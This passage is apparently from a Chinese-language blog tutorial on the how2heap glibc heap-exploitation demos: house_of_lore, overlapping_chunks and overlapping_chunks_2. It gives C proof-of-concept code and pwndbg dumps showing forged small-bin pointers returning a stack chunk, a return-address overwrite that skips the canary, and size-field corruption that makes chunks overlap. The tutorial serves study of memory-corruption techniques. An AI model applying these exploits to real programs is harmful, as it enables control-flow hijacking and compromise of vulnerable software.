0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>这个时候，victim chunk 的 bk 指向了 stack_buffer_1，而我们之前设置了 stack_buffer_1 的 fd 指向了 victim_chunk。由于 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时的 small bin 链表整理如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fake chunk 2 &lt;-- fake chunk 1 &lt;-- victim chunk &lt;-- head</span><br></pre></td></tr></table></figure>

<p>fake chunk 2 的 bk 指向了一个未定义的地址。</p>
<blockquote>
<p>如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<p>接下来我们 malloc 一块 chunk，如果我们 malloc 的大小恰好是 victim chunk 的大小（也就是第一块被 free 掉的内存），这时 glibc 会将 victim chunk 取出，设置它的 bk 为 victim 的 bk。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p3</span><br><span class="line">$12 &#x3D; (void *) 0x603010</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p3-0x10 </span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x603010:	0x00007ffff7dd1bd8	0x00007fffffffdc70</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000070	0x00000000000003f1</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">       stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br></pre></td></tr></table></figure>

<p>最后一次 malloc 时会欺骗 glibc 返回 bin-&gt;bk 指向的 chunk。在这次 malloc 后，stack_buffer_2 的 fwd 指针会发生改变，而且 p4 会在栈上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p stack_buffer_2</span><br><span class="line">$14 &#x3D; &#123;0x0, 0x0, 0x7ffff7dd1bd8 &lt;main_arena+184&gt;&#125;</span><br><span class="line">pwndbg&gt; p p4</span><br><span class="line">$15 &#x3D; 0x7fffffffdc80 &quot;\330\033\335\367\377\177&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"><span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br></pre></td></tr></table></figure>

<p>接下来我们就可以利用内存中的 shellcode 完成攻击了。</p>
<p>p4 + 40 是 main 函数的返回地址，被修改为 jackpot 的地址，执行流被重定向完成了攻击。</p>
<blockquote>
<p>最后，我们说的是small bin 链的构造，其实我这里用的是 fastbin ，其释放后虽然是被加入到 fast bins 中，而small bin是释放后 放入 unsorted bin，但 malloc 之后，也会被整理到 small bins 里。</p>
</blockquote>
<h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><p>Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk</p>
<blockquote>
<p>简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。</p>
</blockquote>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;overlapping_chunks</span><br><span class="line"></span><br><span class="line">This is a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line">Let&#39;s start to allocate 3 chunks on the heap</span><br><span class="line">The 3 chunks have been allocated here:</span><br><span class="line">p1&#x3D;0x603010</span><br><span class="line">p2&#x3D;0x603110</span><br><span class="line">p3&#x3D;0x603210</span><br><span class="line"></span><br><span class="line">Now let&#39;s free the chunk p2</span><br><span class="line">The chunk p2 is now in the unsorted bin ready to serve possible</span><br><span class="line">new malloc() of its size</span><br><span class="line">Now let&#39;s simulate an overflow that can overwrite the size of the</span><br><span class="line">chunk freed p2.</span><br><span class="line">For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.</span><br><span class="line">To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.</span><br><span class="line">We are going to set the size of chunk p2 to to 385, which gives us</span><br><span class="line">a region size of 376</span><br><span class="line"></span><br><span class="line">Now let&#39;s allocate another chunk with a size equal to the data</span><br><span class="line">size of the chunk p2 injected size</span><br><span class="line">This malloc will be served from the previously freed chunk that</span><br><span class="line">is parked in the unsorted bin which size has been modified by us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at 0x603110 and ends at 0x603288</span><br><span class="line">p3 starts at 0x603210 and ends at 0x603288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data on</span><br><span class="line">chunk p3, and data written to chunk p3 can overwrite data</span><br><span class="line">stored in the p4 chunk.</span><br><span class="line"></span><br><span class="line">Let&#39;s run through an example. Right now, we have:</span><br><span class="line">p4 &#x3D; x���</span><br><span class="line">3 &#x3D; 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�</span><br><span class="line"></span><br><span class="line">If we memset(p4, &#39;4&#39;, 376), we have:</span><br><span class="line">p4 &#x3D; 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�</span><br><span class="line">3 &#x3D; 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�</span><br><span class="line"></span><br><span class="line">And if we then memset(p3, &#39;3&#39;, 80), we have:</span><br><span class="line">p4 &#x3D; 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�</span><br><span class="line">3 &#x3D; 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>首先申请三个 chunk，分别填充 1、2、3。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x3131313131313131, </span><br><span class="line">  bk &#x3D; 0x3131313131313131, </span><br><span class="line">  fd_nextsize &#x3D; 0x3131313131313131, </span><br><span class="line">  bk_nextsize &#x3D; 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3544668469065756977, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x3232323232323232, </span><br><span class="line">  bk &#x3D; 0x3232323232323232, </span><br><span class="line">  fd_nextsize &#x3D; 0x3232323232323232, </span><br><span class="line">  bk_nextsize &#x3D; 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603200 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 3617008641903833650, </span><br><span class="line">  size &#x3D; 129, </span><br><span class="line">  fd &#x3D; 0x3333333333333333, </span><br><span class="line">  bk &#x3D; 0x3333333333333333, </span><br><span class="line">  fd_nextsize &#x3D; 0x3333333333333333, </span><br><span class="line">  bk_nextsize &#x3D; 0x3333333333333333</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来 free chunk 2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>chunk 2 被分配到了 unsorted bin 中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3544668469065756977, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x3232323232323232, </span><br><span class="line">  bk_nextsize &#x3D; 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603100 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603100</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">	<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">	<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>接下来我们假设有一个溢出可以覆盖 p2 的 size。尽管对于我们的程序来讲最后三位并不重要，但是为了堆的稳定性，最好还是不要随意改动。为了保持稳定性，我们至少要将最低位（LSB, prev_inuse）位保持为 1，这样 p1 就不会被误认为是一个未分配的块了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">	 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br></pre></td></tr></table></figure>

<p>我们将 p2 的 size 改写为 0x181，之后 malloc 会返回给我们一个 0x178 大小的块。</p>
<p>修改前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg p2-2</span><br><span class="line">0x603100:	0x3131313131313131	0x0000000000000101</span><br><span class="line">0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x603120:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603130:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603140:	0x3232323232323232	0x3232323232323232</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg p2-2</span><br><span class="line">0x603100:	0x3131313131313131	0x0000000000000181</span><br><span class="line">0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x603120:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603130:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x603140:	0x3232323232323232	0x3232323232323232</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x3131313131313131, </span><br><span class="line">  bk &#x3D; 0x3131313131313131, </span><br><span class="line">  fd_nextsize &#x3D; 0x3131313131313131, </span><br><span class="line">  bk_nextsize &#x3D; 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3544668469065756977, </span><br><span class="line">  size &#x3D; 385, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x3232323232323232, </span><br><span class="line">  bk_nextsize &#x3D; 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603280 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 3689348814741910323, </span><br><span class="line">  size &#x3D; 134529, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时 chunk2 会吞并 chunk3。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">	<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>接下来再申请一块 0x178 大小的内存，malloc 会把 chunk2 和chunk3 一起分配出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p4</span><br><span class="line">$2 &#x3D; (intptr_t *) 0x603110</span><br><span class="line">pwndbg&gt; p p2</span><br><span class="line">$3 &#x3D; (intptr_t *) 0x603110</span><br><span class="line">pwndbg&gt; p p3</span><br><span class="line">$4 &#x3D; (intptr_t *) 0x603210</span><br><span class="line">p4 has been allocated at 0x603110 and ends at 0x603288</span><br><span class="line">p3 starts at 0x603210 and ends at 0x603288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure>

<p>现在我们修改 p4 的时候，p3 也会被修改；修改 p3 的时候，p4 也会被修改。</p>
<h2 id="overlanpping-chunks-2"><a href="#overlanpping-chunks-2" class="headerlink" title="overlanpping_chunks_2"></a>overlanpping_chunks_2</h2><p>Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk.</p>
<blockquote>
<p>同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。</p>
</blockquote>
<h3 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line"><span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line"><span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line"><span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line"><span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br></pre></td></tr></table></figure>

<p>我们先 malloc 5 块 chunk，<strong>第五块</strong>的作用是防止 chunk4 free 后被放入 top chunk。这里的覆盖目标是 chunk2 到 chunk4。</p>
<p>首先 free chunk 4</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p4);</span><br></pre></td></tr></table></figure>

<p>由于 chunk4 是 free 状态，p5 的 pre_size 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p5</span><br><span class="line">$1 &#x3D; (intptr_t *) 0x603fd0</span><br><span class="line">pwndbg&gt; x&#x2F;20gx p5-4</span><br><span class="line">0x603fb0:	0x4444444444444444	0x4444444444444444      &lt;-- chunk 5</span><br><span class="line">0x603fc0:	0x00000000000003f0	0x00000000000003f0      &lt;-- prev_size   &#x2F;   size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br></pre></td></tr></table></figure>

<p>接下来假设 chunk1 有堆溢出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br></pre></td></tr></table></figure>

<p>我们可以修改 chunk2 的 size。修改前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p2</span><br><span class="line">$2 &#x3D; (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p2-2</span><br><span class="line">0x6033f0:	0x4141414141414141	0x00000000000003f1      &lt;-- size</span><br><span class="line">0x603400:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603410:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603420:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603430:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603440:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603450:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603460:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603470:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603480:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg p2-2</span><br><span class="line">0x6033f0:	0x4141414141414141	0x00000000000007e1      &lt;-- size</span><br><span class="line">0x603400:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603410:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603420:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603430:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603440:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603450:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603460:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603470:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603480:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure>

